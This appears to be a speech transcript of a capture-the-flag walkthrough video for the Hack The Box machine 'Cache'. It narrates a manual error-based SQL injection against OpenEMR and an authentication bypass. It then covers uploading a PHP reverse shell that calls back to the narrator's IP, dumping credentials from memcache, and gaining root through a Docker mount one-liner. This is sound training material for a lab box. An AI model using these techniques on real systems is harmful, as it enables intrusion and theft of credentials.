 what's going on youtube this is ipsec i'm doing cash from hack the box which has a lot of fun things to show the very first being a dns brute forcing through virtual host it's the only part of the box that i'm not a huge fan of and i think why it didn't get super high reviews because it's a bit unrealistic to have to brute force the domain name of the box through virtual host file because you have dns to do that for you if you do subdomains that's completely valid but this one was doing an actual domain and you'll see probably in 10 to 15 minutes after that though the box is really fun you have to do a error-based sql injection and i bet a lot of people probably did it just through sql map but we're going to go and do it all manually show a little bit of burp suite intruder because the last time we did a error injection through sql i think i wrote a python script so i like changing it up so when you see the same thing it's a little bit different it's also been probably over a year since we did error-based sql injection and then after that there's a memcache like just enumerating to see what's in the database extracting usernames and passwords and using those to su and a docker one-liner to get root so with all that being said let's just jump in as always we're going to start off the nmap so sudo and map dash sc for default scripts sv enumerate versions oh a output all formats print the nmap directory and call it cache and then the ip address which is 10 10 10 188 can take a water run so i've already ran it looking at the results we have just two ports open the very first one being ssh on port 22 it's telling us it's on ubuntu server we also have http on port 80 and it's running apache and also tells us it's ubuntu we got the title of cash but there's really no other information so let's just go check out the web server so going to 10 10 10 188 and we get a page that just has like what is hacking or something so i'm going to poke around the page but first let's just run a go buster and before you do go posture it's always nice to identify what type of page this is it's like php python what is it because that kind of influences what dictionaries and commands we run so i do like index.php it's not found so this is probably not a php web server just seeing like html files this is like indicating it is potentially completely static i'm going to do control u to view the source and see if i have any hints of any type of framework but right now i'm thinking this is just a completely static website so let's just run go buster against this so we'll do go buster dash u for url http 101010 188. and before we do this we have to put it in der mood uh dash w for word list we're going to do opt set list and then discovery web content i forgot what one i normally use i guess raft small words is going to be the one we generally use now so wrapped small world words dot text and do dash x for arguments html dash o go buster dash root dot out so we'll let that run so we have something going in the background while we poke at this you can never get your time back so it's always important to have something running while you just mainly look at something going to author we do have a potential username of ash uh this host cache.htb so i'm going to go and edit my host file so sudo vi etsy host and we're going to do 10 1010 188 put the host name in there and then keep going he's a security researcher and other projects like cash hms hospital management system and this it's a long shot but this is a big hint um later on we'll see hms is an actual domain name on this so other projects like cache cache.htb hms hms.hdb it's a long shot but that is the intended hint but when i was going through this box i went over to like the login page and i tried some default things like admin admin and when i go to login password didn't match username didn't match so we have a way to enumerate both username and password on that previous page it said the user was ash so i do that i just get password didn't match i'm going to send this over to burp suite so we can do some type of sql injection so i set intercept on and my burp suite is already on burp i'm going to do log in and it doesn't go to bur i'm going to ctrl shift r to refresh the page and i always do ctrl shift r because i think that like clears the cache or something it it tends to work better than just controller and we'll try username of ash password of please subscribe log in and we don't get anything in bur so something weird is going on let's take a look at the source so i press control u again and see what happens here uh it looks like there is a jquery functionality.js that's the first one i'm going to look at because these are going to like websites this is not created by the ctf this is on the web server so yeah let's check that out and we have some javascript here and it's function check correct password if password is have fun then uh oh if password is not have fun then print password did not match if username's not ash print username didn't match so we got some client client-side validation here so we can just put the password of have fun and log right in well again we see the red dot near the bottom of my screen so it went over to burp and we just get welcome back this page is still under construction so nothing too interesting after we log in but we should mark down those creds so i'm going to do vi credentials.txt and i copied the i guess masked out password um let's see copy hash i'll do control shift insert there's two clipboards on linux so i was doing shift insert which is that control shift insert is a second clipboard always gets me but yeah so we have that credential file this go buster is still running we got a lot of 403s that it's showing us i'm not sure why it's showing fourth i guess what is 403 is that access denied let's just try dot php and see what happens so dot php uh forbidden so anything that begins with a period gets forbidden we have contact us author news login index so everything kind of looks normal we haven't seen anything we haven't gotten to yet so let's do a second go buster and we're going to do a dns discovery so let's look at the help we'll do go buster dns-h and you could just do go buster-h and here the modes dns dir and v-host and thinking about this we probably want to do virtual host brute forcing so we'll do vhost and i say that because i think dns may actually make dns queries so vhost will be a virtual host and that's what we want to do let's see if you don't know what a virtual host is it's pretty simple it's literally just the host header and a website so right here is the i guess virtual host name so we can go to the page we see it's 2698 bytes sometimes web servers host multiple application this is super common in like shared hosting environments and the web server knows which application to go to based upon this header so if the web server had a different name a different application for cache.hdb it would serve it to a different place and before i hit this i'm taking note 2698 it stayed the same so cache.htb did not resolve to a different page so let's go and finish our go buster command so we want dash u for url and this can be a little nostradamus because i know i want to do a main domain not a subdomain so i'm just going to do http colon slash hdb normally i would do like uh cache.hdb so it enumerates subdomains but i just want to enumerate the main domain so we're going to try this i don't know if it's going to work but yeah it's worth a shot and we'll use the word list up sec list discovery dns and sub domains top million 2000 this seems fine does this error word list not set we forgot dash w for word list and we'll see if this works um let's see unable to connect to this so let's do etsy host and we'll say this is also htb does it work now looks like it does and that's a weird one to go um global catalog dot underscore something i don't know why it discovered that page but i guess maybe apache just for hundreds i really don't know the etsy host pseudo i guess we didn't have to do that we could just put it in this host header uh bad request maybe it doesn't like underscores and the name yep anything with the underscore looks like it's going to be a bad request so it's still running i'm going to fast forward the video until this command finishes and hopefully it actually gets a hit i'm surprised it hasn't yet so let's just speed things up and we have found hms.htb so let's go over to burp suite before we edit our host file we put hms.htb and we get file not found so let's just do slash we get 302 found and we go to a location we didn't know before so we have found a valid domain name for this so let's go sudo vi etsy host and change this to add um hms.htb so now our box can actually resolve it so if we go to hms.hdb it's going through burp suite is our proxy off looks like it is and we get open emr the copyright is 2018 so right off the bat i'm going to check out search boy to see if there's any exploits for it so search point open emr if i can type that would be handy and let's see looking at 5.0 we have authenticated stuff this rce right here generally when i see like command injection cross-site scripting i'm assuming that requires some type of credential or cross-site scripting attack so looking at this i see authentication right here so i'm going to ignore that one we see 410 sql injection so before i throw this let's see if we can enumerate what version this is so i'm just going to ctrl u to look at the source it said for one something so i just search for 401 don't see it let's try five period still don't get a hit so the next thing i generally do when i want to enumerate versions is i just search for it on github so github open emr and look at what files are in the web directory so we're going to interface login.php and i see an interface directory here so chances are i'm in webroot right now and we can check if we can hit these files a good one normally is like readme uh readmes or changelogs changelog is a goldmine if you ever find that because it always tells you what version it is we can do readme.me was that what it was oh md not emmy and we get a file we can look at this file and see if it has a change log i don't know how to zoom on this right here maybe nope let's search i'm just gonna do four dot nothing five dot nothing version spelled correctly we don't have anything so this dreamy dot md doesn't tell the version i don't think any of these files do we can try version.php but it doesn't actually return anything so we don't really have too much uh at this point i'd probably like google open what was it emr and then exploits to see if there's anything here and 5013 vulnerability report so let's take a look at this and see if an exploit just didn't make it into exploit db and we see a bunch of sql injections and actually before i do that said we'd test this out not that one the sql injection to confirm it's not four one zero so we can just look at this and it's doing this query so we can just send this into a browser and see if we get anything for this let's turn burp suite on send repeater tab this and doesn't look like we get anything based upon this it's doing a union injection so we should see the username and we don't so i'm going to assume that exploit doesn't work so going back to this pdf we have a bunch of sql injections i'm gonna look at the first one and looking at this poc it's pretty messy uh for rand like there's a lot of text there so i'm just gonna move on to the next one and we have a relatively look simple looking exploit of this so i'm just going to paste and try this and if i just go back to our burp window send we'll have to do url encoding so let's just control u to do that and we just get a three or two found so i go back to the page and let's read what they say about this there's an sql injection in this that's caused by unsanitized input exploiting this vulnerability requires authentication however it can be exploited without authentication when combined with the patient portal bypass mentioned above so let's look at the patient portal bypass so going to the very top we look at this able to bypass the patient portal login by simply navigating to the registration page and modifying the requested url to access the page so let's try that first let's turn burp suite intercept off and we're going to the login screen i don't see any like registration i'm just going to guess and try login register.php to see if we hit anything and not found so go back to this github page scroll up to the top look for register.php to see if that file exists anywhere and let's see register.php looks like it's in portal account register.php so let's go portal account register.php so like the cv says we hit the registration page and what i'm going to do is turn burp suite back on ctrl shift r send this request to repeater and i'm going to copy this we're just going to send this url in this and what this did by hitting the registration page it probably set some value in either php session id or openmr that gives us access to hit this page so sending this request we get an error message so again on this one same exact request no error this one error message we can try putting the php session id to identify what cookie did it so putting this here we get an error message so it's the php cookie that gives us this error message we can try using this php cookie to see if this one has any data in it that would do it but it doesn't so the registration page set something in this session that lets us access this page what i guess i didn't have it on my clipboard so paste send so now we have a error message let's see it says you have an error in your sql syntax uh we don't have a space there there we go so this is xpath syntax error what we're doing is error based sql injection and we have a very limited amount of space right here and we could just send this to burp suite right our sql map right now and dump everything but you guys normally like seeing how it actually works in the back end so we're gonna go dig into this sql injection while we do the um sql injection manually so i'm just going to delete this real quick and we'll copy the file where is that see copy the file right there change your directory to be cache and this will be um inject.request and then i will put our error message back there and we'll just start sqlmap in the background so inject sqlmap-r request dash dash dump dash dash batch and this should just run the background dump everything but if you want to learn if what i'm about to say doesn't make sense how to do this always go over to like ipsec dot rocks and look at one of the older videos of me explaining things because i tend to do more research when i first started and explain things a bit better maybe i don't know so we'll see so you can just do sql probably error and specify an error string and sql map that's not it manually doing error based sql injection with extract query so this video is probably going to be exactly what we do so let's go back into burp suite and what i'm going to do is change this extract value command to be a sql statement so i always like doing instead of just 0 0x0a which is a line break oh no 302 found sql map did something it invalided my session that is annoying but turn off hit the registration page go on now we should have intercept on copy these cookies paste this okay we are back so um what i was saying i always like having we are on this one the 0x0a as a line break because without it it looks like this where this is our actual input we're looking at but if we put that line break there instead 0x0a right there so extract value doesn't need anything but if we put the line break that's what we injected so it makes it much easier to just see i think so see that's concat so we can do a sql statement right here so let's do select database and we have a error in sql syntax do i need another parenthesis there we go so database is open emr so this is important because we're going to be enumerating the information schema table and if we went through like all the default tables and databases it would just take forever so this lets us skip a lot so let's go over to mysql information underscore schema turn burp suite off intercept and the first table we want is probably tables come on there it is the tables table and this tells us how this is laid out uh table schema this is the database name and then we'll probably want uh column name and table or just table name so let's go back to prep suite and we'll do instead of select database let's just change select one session went back to invalid something is happening sql map wasn't running let's see uh and extract value okay let's just hit the registration page yet again hit and i guess we have to grab a new cookie it's gonna be annoying if we have to keep doing this what if someone else is on this box that is doing something php sessions different okay unknown column select so let's do select plus one and we have the x path correct so we can do select table name from information schema dot what is it information schema.table underscore schema so nope this is the database name my bad table name and we are in information schema tables so from information schema tables so this is database dot table and we can say where is it table underscore schema yep table underscore schema is like open ems let's see select table name from information schemas where table schema like open ems try another quote get rid of a quote let's see to the right near i wonder if i didn't url encode something gray field let's do open percent okay maybe it's not open ems um let's do this real quick select database open emr so that's where that mistake was percent and um sql is wildcard so sub query returned more than one row so we can get around that by doing limit one and we got one thing and we can do comma one and this is going to be um row and max number of rows so we can do like limit 0 1 to get address mixed data amendments and we can start dumping every single column inside of this table but we're going to 50 and there's still columns so there's a lot of columns in this table and i normally use like a python script in the video to show you how to do that but i mean it's going to take like five to ten minutes to write that you should be able to do that as a good exercise instead i'm going to show you a pretty cool feature and but i think it's the paid feature though that is the intruder so we can do go to positions clear everything and we want to inject right here so i'm just going to do add around that and i'm going to go to payloads instead of simple list i'm going to go to numbers or do sequential from zero to 300 step is like the increment if it was two it would go like zero two four six eight uh one just goes and even increments of one so we start the attack and we're getting a bunch of things so we can go through this if i move it up go to response query error so we can see it's getting data but it's a pain to kind of look through it that way we can go through the grep extract and if we click add we can say start at expression and highlight this copy paste so we're starting here and we're ending at a single quote so if this end delimiter was blank it would show us everything as we're going that's why i was a bit confused so and that single quote and it's going to grab everything between what we just typed click ok go back to our results wait what four crap uh oh i clicked eight four six my bad start at the expression and then end at delimiter that's what we want go back to results and i don't know why it did not work let's remove and redo this real quick we start here we end at a single quote click ok it may have just not liked me editing it hopefully that's the case yep there we go so here's the tab and it shows everything so you just scroll through all these tables and we see users use the facility and user secure and you could look in the like php code you could dump it manually but i'm going to cheat i know we want this user's secure table so let's go back to the information schema how this is set up we can look at columns uh let's turn off burp suites goes a bit faster uh let's see go back and we want the columns table and this is pretty much the same thing with table name schema name but it has column name the reason why i didn't start at that because table name when it incremented it would be like 0 through 50 has the same table name so that's why i started enumerating the tables column so we can go back into grip suite go to repeater tab i'm going to double click this one and say extract tables and then we'll do this one and say extract columns and instead of table schema we can say table name is like users underscore secure and we want to select the column name uh from oh we are still on information schema tables so we can do columns and we get id so we can go 0 1 so id username password salt last update password history so we probably want to get username and we can just do select username from users secure and we don't have to specify the database because that's the active database we're in when we did like the database open close parentheses it told us we're in open emr so username is going to be open emr underscore admin and we could also look at the next one potentially so if we do plus limit zero one one one so there's no second user on this only one so open emr admin so v i guess crack because we're going to probably get a password hash so the next one's going to be select password from this and here's what we get for the password and this is where it's going to be important to note that there is a max and xpath i mentioned it before if we do echo dash n paste this wc-c we are 31 characters keep in mind we inserted a line break that is this with this concat so we are actually at 32 characters so the next thing we have to do to get more characters to see if there are more is a substring command so we can do substring what we want the variable name so password and then probably zero two let's just see if this works uh error let's try starting at one and we get two characters so let's grab the first 30 that's going to be at the period t so i'm going to copy this we're going to back here v crack let's see i'm just going to re-paste this there we go so let's go from 30 to 60. and i'm going to do 29 to 60 real quick so it's period t and we want to look at what we grabbed we grabbed period t so let's go 30 and then 31. so this is starting right where we left off i always like going a little bit before just to make sure we're grabbing everything we want so that looks like the password hash we can crack and i think cache is generally like ending and like even numbers so echo dash n wc-c 53 maybe that's good it's not what i expected but we'll just try to crack cracking this hash real quick so let's cat crack and we should have the hash i'm gonna ssh to the kraken which again is just a box in my basement because you should never crack in vms and additionally cracking on a machine where i'm doing my recording would result in like drop frames potentially so i always sh off of my box to do it it doesn't hurt that this box has a few graphics goods in it to help speed things up so put the hash in a file and this one's actually tricky to crack um whenever i see two something dollar this i know this is going to be a b cryptash this is kind of the algorithm it's using to encrypt and this is the iteration count i believe um so if we do example hashes grep two way zero five oh actually it looks like it grabs it so let's do dash b five so this one it grabbed uh it's two stir something b crit blowfish you may also see like two y and when it's two y you still use the same algorithm but yeah and the iteration count could be different it could be like 10. so mode 3200 so dot slash cat dash m 3200 hashes slash uh what is it cache and opt word list rockyou.txt and oh because i have the username i just specify dash dash user i believe maybe it's username i always like putting the username in my hash files just so i know what it went to afterwards so we can see it cracked and the password was a few x's so i'm just going to do show we can see 6 x's is the password for the user open emr admin so let's go back to our website 10 uh this is going to be hms.htb and we can log in so open emr underscore admin three one two three six x's for the password and we get in and if we read a lot of the reports on like exploits it kind of highlights this but it's simple enough you just go to administration files and we have a file manager here so we can just drop a php shell so i'm going to go back to my box locate um forget where it is locate dot php cd user find dot grep php codium grep shell okay here zips it's this uh user share water numb i don't know exactly what that is but this is the web shell i always use with php at least my first one so go to php i'll look at this php reverse shell since we're going to be editing it i'm going to move it back to my directory where i'm working so http cache go into that directory and we can edit this file removing the comments and we just want to put ip import so let's do 10 10 14 2 i believe that is my ip and the port 9001 okay let's name this to please subscribe dot php and do a nc lvmp on 9001 and then let's go to upload this so browse ipsec hdb cache please subscribe dot php uh destination use source that is good and we're uploading to sites default images save let's see if that actually worked hms.htb site's default images please subscribe.php and we have a shell so we can do which python which python3 so we have python3 on the box so python3 dash c import pty pty.spawn ben bash gets me kind of a shell but i don't have things like tab autocomplete right now so i'm going to press ctrl z to background the shell stty raw minus echo hit enter then type f g enter twice and we're back in the shell so now i have tab auto complete um i'm going to do export term is equal to x term and now i can clear the screen which is handy and i'm going to do ss lnpt to look at open ports we could just run like um uh lin p's or something and do this but should always look at open ports and we see two things of interest the first thing is a sql database and one one two one 1 this is a memcache port the first thing i want to look at is probably going to be the um sql database so we go in public.html and maybe find.grep config config.php maybe sitesdefaultconfig.php data i don't know where the database is um maybe grep i mysql on sites default config.php grab database star set up let's see let's just google open emr change database password see if they tell us what password this uh what file the password is in see administration users doesn't look like it's there see change openmr okay once i change this password what file do i edit php sqlconf.php so find out grab sql comp cat sites default sql conf and we got the login open emr and this password so we can try mysql dash u open emr do dash p enter the password and actually i don't know why i'm doing this because we did sql injection to enumerate the usernames show tables no database selected so we can do use open emr and then maybe like select star from users uh we got open emr admin female service but we don't have any password hashes here so we can do users underscore secure see if we had any more users we actually oh no we don't have another user so just still one user in this database there's not much we can do for that so we could try that password with valid users so we could like cat etsy pass wd and we see ash luffy let's grab for bash to get login shells so i have the password still my clipboard so i can do like su dash put that password in try logging in we can do su ash try login we could go to the credentials we have and try these passwords this was from that like login page way off the beginning so s u dash log in s u ash dash login oh that's ash's password can we just just ssh in 10 10 10 188 yes oh ash oh ash is on the um sh denied users as i mean last type of password fam we put an invalid user huh okay luffy and ssh s u dash uh luffy try those passwords and can't get in so let's enumerate that oh shoot i don't know what it just said session terminated terminating shell but still got a shell so things look fine so let's go to um memcache so you could just google like exploiting memcache because that's what's listing on port one one two one one and there's a bunch of things you can do um this is a really good one i think this hacking articles if it loads this is a good one to read again if you probably go to ipsec.rocks and type in memcache pretty sure we've exploited it before yep so we've definitely exploited before so telnet localhost one one two one one and let's see we want to do maybe stats items and we can see there's five items in this uh memcache database and essentially what memcache is it's just a caching thing that stores the like output of some variables so it doesn't have to keep running the code again so if you have like a heavy sql query let's say um the hall of fame or a bunch of like scores and you do a bunch of calculations based upon all the flags every user of a website hit you don't want to run that calculation any time someone hits like hall of fame.php so memcache will cache all that information so when you hit that page again it's stored a lot so it's not a heavy query against the database again so essentially that's what memcache is doing um let's see we can do after stats items stats labs is this it what is the next thing stats items you know about that oh cash dump and the slab id which is going to be 1 is the first one and then 0 is going to be unlimited so if we do stats cash dump 1 0 we see there are 5 items in this cash article i don't think there's any others so if we do stats cash dump five zero nothing stats cash dump zero zero stats cash dump 2-0 whoops stats cash dump 2-0 nothing so we just have link user passwd file account so we can do get link it's pointing to hack the box get user luffy get past wd one piece get file get account so luffy has the password of one piece so i guess they're a anime fan so let's do ssh luffy or luffy i forget how you pronounce his name put his password in and we can log in to this box so we can try sudo l enter his password and he can't run pseudo um lsla there's nothing really there ash is the one that had the user.txt file if you wanted to go grab that um so we could do like find slash dash perms minus zero or is it four thousand first set uid bits dev null that looks like for a set uid i think that's working uh let's see um we can do ls and this will tell us does this have set uid yeah everything here has s here so that's saying set uid i don't really see anything too interesting we can also run like groups to see what i'm a member of and i'm a member of the docker group so what i'm going to do is go to gtfo bins and we're going to search what docker can do so we got a shell sounds pretty cool docker run slash mount rrm it alpine ch root mount sh let's just try running this and see what it does unable to find image alpine latest locally so it doesn't look like it's going to work so we can do docker images to list what images are here alpine is just a really small linux distro so it's common in docker so i ran docker images we see ubuntu is here so we can run ubuntu we do id we are root ls we can go into root and get root.text so what this did um i think v is mount point so essentially docker has permissions over the um like it's a set uid binary i think let's do this find command grab dash i docker uh which docker stats did i screw up a command maybe it's just that zero seven five five no it's not set uid um it's because the docker user has the permission so essentially when he does docker things in linux he can take over the disk and that's what this is doing i believe um i haven't looked into it in a while but the docker command does this actually explain it no uh let's see explain bash shell command there was a web page that would just explain i said explain i typed exploit uh explain bash shell let's see if it actually works with docker it's better than me potentially getting it wrong so explain shell to me paste explain docker it doesn't know so i think this is mount point um man docker see dash v i'm pretty sure that's mount point it's um mounting slash and the containers slash mnt the dash dash rm i think is delete when done maybe let's see it's not explaining what rm is um i t is like an image name ubuntu and then we're going to ch root so we're going into slash mount and then running bash so if we got rid of this ch root it would probably be a bit more obvious what's happening so if i do cd slash root now and go into it there's nothing here because i'm in the ubuntu docker image but remember we mounted slash of our host operating system into slash mount so we go to slash mount that's where another operating system is which is the host and we got root there if you wanted to show the box you could do dot ssh and put an ssh key and then sshn or you could edit the shadow file you can edit yeah there's a bunch of ways you get root from here um exit go back to that ch root one just do docker like that and what i want to do is cron tab dash l to list and we can see all the crons that run on this and every minute it's running this bash script which is putting the information inside of memcache so if you didn't want to access memcache through telnet you could always use chisel and we could set up a tunnel so do i still have that netcat session up i do so let's exit tonight and i held control and did right bracket to get to this telnet prompt and i can type quit to exit telnet and let us upload chisel and run a bunch of binaries against memcache to enumerate it for us going back to firefox let's go and search for chisel so chisel github grab this and let's see there should be a release 1.71 i'm going to download amd 64. save going to cp downloads chisel unzip d chisel we should have it here so make dirt dub dub dub mv chisel to dub dub dub i'm actually not going to bother um using python hdb server to transfer this instead i'm just going to run netcat so netcat lvmp 9001 and direct chisel to it and we can go to dev shm netcat netcat1010142 9001 connect to my box and send whatever my box sends me down to chisel so connected and it is currently sending i'm going to ctrl c out of this because it's probably sent by now the only downside to this doesn't um control c out for you c h mod plus x chisel and we see they're this exact same size we should probably md5 sum them but i'm lazy i'm just depending on that file size right now chisel server dash dash reverse because we want to do a reverse port forward the reverse port forwards whenever a client is connecting to your server and saying hey open up port this and send all that content to me a local port for it is when the client connects to the server and says here is my port um i'm going to send it to something on your port if you're confused i've referenced this enough but go to the reddish video i have a bunch of like powerpoints explaining all the port forwarding because it's much easier to do in graphics uh oh it looks like pointerdo reference chisel server maybe okay um chisel defaults to port 8080 and port 8080 was in use glancing through this that is not an obvious error code port 8080 is currently in use by brip suite so so i do chisel server port 8000 reverse and we can do chisel client 10 10 14 2 port 8000 r for reverse one two one uh one one two one one we wanna send memcache on our localhost this is what port to listen to on the remote end so my cali my parrot box is going to open up port 1 1 2 1 1 when everything anything goes to that port it's going to send it through this tunnel and its destination is going to be this so we have that tunnel set up by netcat localhost one one two one one stats items memcache is working so now we can do like metasploit to enumerate this so msf db run and go gem install io console pseudo hopefully i don't bork my instance i probably should have um snapshotted sudo msf console huh user share metasploit framework something broke sudo bundle install or maybe i should have done that it's telling it's saying don't run bundler as root ah too late come on this is promising there we go so no clue what that was about um but relatively easy to fix search memcache and oh we got pretty highlighting let's see auxiliary gather memcache extractor use oh i could have i don't think i've used matters point six before this is a much prettier interface and for all the people that don't like metasploit well it gets the job done it's quick and for a lot of things i think you'd be silly not to use it so we can do show options set our host 12701 run and we see found four keys account file passwd and not really that pretty of input but we grabbed them luffy one piece whatever so memcache or search memcache is another one we could run ep version denial of service nope so that's dumping it through metasploit and the reason why we had to use metasploit is because or not metasploit um chisel if we look at this port on a remote box it's closed but yeah so let's see another way we can do this is probably through some binaries so we can just install lib memcache tools and use the native tools to play with it and these tools are essentially sending the same exact packets we did with our um tonet command so when starting the package it says and then let's just try this memc stat command and we can probably specify server localhost so mem c stat dash dash server equals 127.001 servers and we get a bunch of information off the server so we can go down memc dump and we get link user passwd file account it's going to give us anything else doesn't look like it memc cat and we can cap the things we saw so memc cat link so we get a link user passwd file account and dump everything so yeah mcp file i don't know exactly what that's doing you can copy through memcache can we file uh mem double cp let's see touch file i will do etsy passwd i think we can upload files um let's see nclvnp 9001 let's go back hit this page oh no we wanted luffy's password which was up here so luffy one piece su dash sh luffy at 10 10 10 188 put one piece in um this is gonna be the docker one liner so gtfo bins shell paste and change alpine to ubuntu now we are root so what we wanted to do was cron tab dash l uh let's see is update on this it is okay so v temp whoa please subscribe we're gonna do temp well run update db on this host locate well update db doesn't look like it uploaded um it's finding who am i which is funny who am i who am i who am i who am i who am i so i need to actually read that more in depth exactly what that's doing data stored and attacker can use to easily upload malicious files to the server to say memcp so we do memcat temp well well so the file may exist somewhere etsy passwd let's see coming down with metasploit and i think we're done i think it just uploaded the file somewhere in memcache's database so it didn't actually put it on the server it just uh yeah let's do the etsy please sub test let's do temp please sub because this model definitely won't exist on the server update db locate please sub uh please subscribe does exist uh find slash to dev null grip please and that will be the video um well that finished fast hope you guys enjoyed take care and i will see you all next week